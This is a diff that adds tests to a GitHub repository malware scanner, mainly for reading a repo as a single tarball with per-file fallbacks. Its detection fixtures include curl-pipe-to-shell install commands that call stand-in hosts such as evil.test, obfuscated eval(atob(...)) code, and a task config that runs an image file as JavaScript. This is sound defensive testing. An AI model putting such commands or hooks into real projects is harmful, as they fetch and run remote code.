@@ -6,12 +6,14 @@
  * benign-but-detectable fixtures — no real network, no real malware.
  */
 
+import { gzipSync } from "node:zlib"
 import { afterEach, describe, expect, it, vi } from "vitest"
 import {
   FETCH_CONCURRENCY,
   extractCommandTargets,
   scanGitHubRepo,
 } from "../src/github/repo-scanner"
+import { MAX_TARBALL_COMPRESSED_BYTES } from "../src/github/tarball"
 import type { SignatureDatabase } from "../src/types/index"
 
 const EMPTY_SIGNATURES: SignatureDatabase = {
@@ -1487,5 +1489,302 @@ describe("install scripts that only look like dynamic code", () => {
   it("still reports an install script that pipes a download into a shell", async () => {
     const result = await withScript("curl https://example.com/setup.sh | bash")
     expect(result.findings.some((f) => f.type === "POSTINSTALL_SCRIPT")).toBe(true)
+  })
+})
+
+describe("reading the repo as one tarball", () => {
+  const SHA = MOCK_COMMIT_SHA
+  const ROOT = `sample-${SHA}`
+
+  function tarEntry(name: string, body: Buffer | string, typeFlag = "0"): Buffer {
+    const data = Buffer.isBuffer(body) ? body : Buffer.from(body, "utf-8")
+    const header = Buffer.alloc(512)
+    header.write(name.slice(0, 100), 0, "utf-8")
+    header.write("0000644\0", 100)
+    header.write(`${data.length.toString(8).padStart(11, "0")}\0`, 124)
+    header.write("        ", 148)
+    header.write(typeFlag, 156)
+    header.write("ustar\0", 257)
+    header.write("00", 263)
+    let sum = 0
+    for (const byte of header) sum += byte
+    header.write(`${sum.toString(8).padStart(6, "0")}\0 `, 148)
+    return Buffer.concat([header, data, Buffer.alloc((512 - (data.length % 512)) % 512)])
+  }
+
+  function archiveOf(files: Record<string, string>): Buffer {
+    const entries = [tarEntry(`${ROOT}/`, "", "5")]
+    for (const [path, content] of Object.entries(files)) {
+      entries.push(tarEntry(`${ROOT}/${path}`, content))
+    }
+    entries.push(Buffer.alloc(1024))
+    return gzipSync(Buffer.concat(entries))
+  }
+
+  /**
+   * The same in-memory tree as `mockGitHubApi`, plus the tarball endpoint.
+   * `tarballFiles` defaults to the whole tree; pass fewer to leave a file out
+   * of the archive, and `tarballResponse` to break the endpoint outright.
+   */
+  function mockTarballApi(
+    files: Record<string, string>,
+    options: {
+      sizes?: Record<string, number>
+      tarballFiles?: Record<string, string>
+      tarballResponse?: () => Response
+    } = {}
+  ) {
+    const base = mockGitHubApi(files, options.sizes ?? {})
+    let tarballRequests = 0
+    const contentReads: string[] = []
+    const mock = vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
+      const url = String(input)
+      if (url.includes("/tarball/")) {
+        tarballRequests++
+        if (options.tarballResponse) return options.tarballResponse()
+        return new Response(archiveOf(options.tarballFiles ?? files), { status: 200 })
+      }
+      const contentMatch = url.match(/\/contents\/(.+?)\?ref=/)
+      if (contentMatch) contentReads.push(decodeURIComponent(contentMatch[1]!))
+      return base(input as RequestInfo | URL, init)
+    })
+    global.fetch = mock as unknown as typeof fetch
+    return {
+      tarballRequests: () => tarballRequests,
+      contentReads: () => contentReads,
+      urls: () => mock.mock.calls.map((call) => String(call[0])),
+    }
+  }
+
+  const scanVia = async (
+    files: Record<string, string>,
+    options: Parameters<typeof mockTarballApi>[1] = {},
+    tarball = true
+  ) => {
+    const api = mockTarballApi(files, options)
+    const result = await scanGitHubRepo(repoInfo, { signatures: EMPTY_SIGNATURES, tarball })
+    return { api, result }
+  }
+
+  it("reads every file from one request instead of one request per file", async () => {
+    const files = Object.fromEntries(
+      Array.from({ length: 40 }, (_, i) => [`src/mod${i}.js`, `export const n${i} = ${i}\n`])
+    )
+    const { api, result } = await scanVia(files)
+
+    expect(result.scanSummary.readMode).toBe("tarball")
+    expect(result.scanSummary.readFallbackReason).toBeUndefined()
+    expect(result.scanSummary.filesScanned).toBe(40)
+    expect(result.scanSummary.complete).toBe(true)
+    expect(api.tarballRequests()).toBe(1)
+    // The whole point: no per-file content requests at all.
+    expect(api.contentReads()).toEqual([])
+  })
+
+  it("is off unless the caller asks, and then costs nothing extra", async () => {
+    const { api, result } = await scanVia({ "src/index.js": "export const x = 1\n" }, {}, false)
+
+    expect(result.scanSummary.readMode).toBe("per-file")
+    // Not asked for is not a fallback — there is nothing to report.
+    expect(result.scanSummary.readFallbackReason).toBeUndefined()
+    expect(api.tarballRequests()).toBe(0)
+    expect(api.contentReads()).toEqual(["src/index.js"])
+  })
+
+  it("finds the same things either way when both readers see the same files", async () => {
+    // The 0.7.1 refactor left analysis downstream of reading, so swapping the
+    // reader must not move a finding. Coverage is what differs between the
+    // paths; everything after it is shared.
+    const files = {
+      "package.json": `{"name":"demo","scripts":{"postinstall":"curl http://1.2.3.4/x | sh"}}`,
+      "src/loader.js": `eval(atob("YWxlcnQoMSk="))\n`,
+      "scripts/build.js": `const { exec } = require('child_process')\nexec('echo hi')\n`,
+      "README.md": `# demo\nRun \`curl http://evil.test/i.sh | bash\` to install.\n`,
+    }
+    const viaTarball = (await scanVia(files)).result
+    const viaPerFile = (await scanVia(files, {}, false)).result
+
+    expect(viaTarball.scanSummary.readMode).toBe("tarball")
+    expect(viaPerFile.scanSummary.readMode).toBe("per-file")
+    expect(viaTarball.scanSummary.scannedFiles).toEqual(viaPerFile.scanSummary.scannedFiles)
+    expect(viaTarball.riskScore).toBe(viaPerFile.riskScore)
+    expect(viaTarball.riskLevel).toBe(viaPerFile.riskLevel)
+    expect(
+      viaTarball.findings.map((f) => `${f.type}:${f.file}:${f.description}`)
+    ).toEqual(viaPerFile.findings.map((f) => `${f.type}:${f.file}:${f.description}`))
+  })
+
+  it("reads far past the per-file cap, since files no longer cost requests", async () => {
+    const files = Object.fromEntries(
+      Array.from({ length: 450 }, (_, i) => [
+        `src/f${String(i).padStart(3, "0")}.js`,
+        `export const x${i} = ${i}\n`,
+      ])
+    )
+    const { api, result } = await scanVia(files)
+
+    // The per-file path stops at 200 because each one is a round trip.
+    expect(result.scanSummary.filesScanned).toBe(450)
+    expect(result.scanSummary.skippedCount).toBe(0)
+    expect(api.contentReads()).toEqual([])
+  })
+
+  it("bounds the tarball read by source bytes rather than by file count", async () => {
+    // 24 files of 1MB each: over the byte budget, well under the file cap.
+    const files = Object.fromEntries(
+      Array.from({ length: 24 }, (_, i) => [`src/f${i}.js`, `export const x${i} = ${i}\n`])
+    )
+    const sizes = Object.fromEntries(Object.keys(files).map((p) => [p, 1024 * 1024]))
+    const { result } = await scanVia(files, { sizes })
+
+    expect(result.scanSummary.readMode).toBe("tarball")
+    expect(result.scanSummary.filesScanned).toBeLessThan(24)
+    expect(
+      result.scanSummary.skippedFiles.every((file) => file.reason === "over-file-limit")
+    ).toBe(true)
+    expect(result.scanSummary.skippedCount).toBeGreaterThan(0)
+  })
+
+  describe("falling back to the per-file path", () => {
+    const twoFiles = {
+      "src/a.js": "export const a = 1\n",
+      "src/b.js": "export const b = 2\n",
+    }
+
+    it("never asks for an archive a repo this size cannot have", async () => {
+      // Decided from the tree, which is already in hand: abandoning a
+      // download part-way is the one failure that costs real time.
+      const sizes = { "src/a.js": 200 * 1024 * 1024, "src/b.js": 10 }
+      const { api, result } = await scanVia(
+        twoFiles,
+        { sizes: { ...sizes }, tarballResponse: () => new Response("", { status: 500 }) }
+      )
+
+      expect(result.scanSummary.readMode).toBe("per-file")
+      expect(result.scanSummary.readFallbackReason).toBe("too-large")
+      expect(api.tarballRequests()).toBe(0)
+    })
+
+    it("scans per file when the endpoint refuses", async () => {
+      const { api, result } = await scanVia(twoFiles, {
+        tarballResponse: () => new Response("Not Found", { status: 404 }),
+      })
+
+      expect(result.scanSummary.readMode).toBe("per-file")
+      expect(result.scanSummary.readFallbackReason).toBe("unavailable")
+      expect(api.tarballRequests()).toBe(1)
+      // And the scan is a full one, not a degraded one.
+      expect(result.scanSummary.filesScanned).toBe(2)
+      expect(result.scanSummary.complete).toBe(true)
+      expect(api.contentReads()).toEqual(["src/a.js", "src/b.js"])
+    })
+
+    it("scans per file when the body is not a readable archive", async () => {
+      const { result } = await scanVia(twoFiles, {
+        tarballResponse: () => new Response("<html>nope</html>", { status: 200 }),
+      })
+
+      expect(result.scanSummary.readMode).toBe("per-file")
+      expect(result.scanSummary.readFallbackReason).toBe("unreadable")
+      expect(result.scanSummary.filesScanned).toBe(2)
+      expect(result.scanSummary.complete).toBe(true)
+    })
+
+    it("scans per file when the response streams past the download cap", async () => {
+      let sent = 0
+      const { result } = await scanVia(twoFiles, {
+        tarballResponse: () =>
+          new Response(
+            new ReadableStream<Uint8Array>({
+              pull(controller) {
+                if (sent > MAX_TARBALL_COMPRESSED_BYTES + 4 * 1024 * 1024) {
+                  controller.close()
+                  return
+                }
+                sent += 4 * 1024 * 1024
+                controller.enqueue(new Uint8Array(4 * 1024 * 1024))
+              },
+            }),
+            { status: 200 }
+          ),
+      })
+
+      expect(result.scanSummary.readMode).toBe("per-file")
+      expect(result.scanSummary.readFallbackReason).toBe("too-large")
+      expect(result.scanSummary.filesScanned).toBe(2)
+    })
+
+    it("still records a spent budget against the per-file path it fell back to", async () => {
+      // The tarball read does not report a rate limit of its own: the path
+      // that actually runs is the one that gets to describe its coverage.
+      const base = mockGitHubApi(twoFiles)
+      global.fetch = vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
+        const url = String(input)
+        if (url.includes("/tarball/") || url.includes("/contents/")) {
+          return new Response(JSON.stringify({ message: "API rate limit exceeded" }), {
+            status: 403,
+            headers: { "x-ratelimit-remaining": "0" },
+          })
+        }
+        return base(input, init)
+      }) as unknown as typeof fetch
+      const result = await scanGitHubRepo(repoInfo, {
+        signatures: EMPTY_SIGNATURES,
+        tarball: true,
+      })
+
+      expect(result.scanSummary.readMode).toBe("per-file")
+      expect(result.scanSummary.readFallbackReason).toBe("unavailable")
+      expect(result.scanSummary.complete).toBe(false)
+      expect(result.scanSummary.incompleteReason).toBe("rate-limit")
+    })
+
+    it("requests the one file the archive did not carry", async () => {
+      // A config's `node <path>` target is found only after the configs are
+      // read, so it was never in the wanted set — and `git archive` writes no
+      // content for a symlink either. Either way the file still gets read.
+      const files = {
+        ".vscode/tasks.json": JSON.stringify({
+          tasks: [{ command: "node", args: ["assets/logo.jpeg"] }],
+        }),
+        "assets/logo.jpeg": `eval(atob("YWxlcnQoMSk="))\n`,
+      }
+      const { api, result } = await scanVia(files, {
+        tarballFiles: { ".vscode/tasks.json": files[".vscode/tasks.json"] },
+      })
+
+      expect(result.scanSummary.readMode).toBe("tarball")
+      // The target was fetched on its own, and nothing else was.
+      expect(api.contentReads()).toEqual(["assets/logo.jpeg"])
+      expect(result.scanSummary.scannedFiles).toContain("assets/logo.jpeg")
+      // And it was scanned as the JavaScript the task runs it as, not merely
+      // counted — a `.jpeg` gets detectors only because a config invokes it.
+      expect(
+        result.findings.some(
+          (f) => f.file === "assets/logo.jpeg" && f.type === "OBFUSCATED_CODE"
+        )
+      ).toBe(true)
+    })
+
+    it("leaves no trace of an abandoned attempt in the summary", async () => {
+      // The byte-capped selection is made before the request and thrown away
+      // when it fails, so the file cap's skips must be the ones reported.
+      const files = Object.fromEntries(
+        Array.from({ length: 205 }, (_, i) => [
+          `src/f${String(i).padStart(3, "0")}.js`,
+          `export const x${i} = ${i}\n`,
+        ])
+      )
+      const { result } = await scanVia(files, {
+        tarballResponse: () => new Response("Not Found", { status: 404 }),
+      })
+
+      expect(result.scanSummary.readMode).toBe("per-file")
+      expect(result.scanSummary.filesScanned).toBe(200)
+      expect(result.scanSummary.skippedCount).toBe(5)
+      expect(
+        result.scanSummary.skippedFiles.every((file) => file.reason === "over-file-limit")
+      ).toBe(true)
+    })
   })
 })
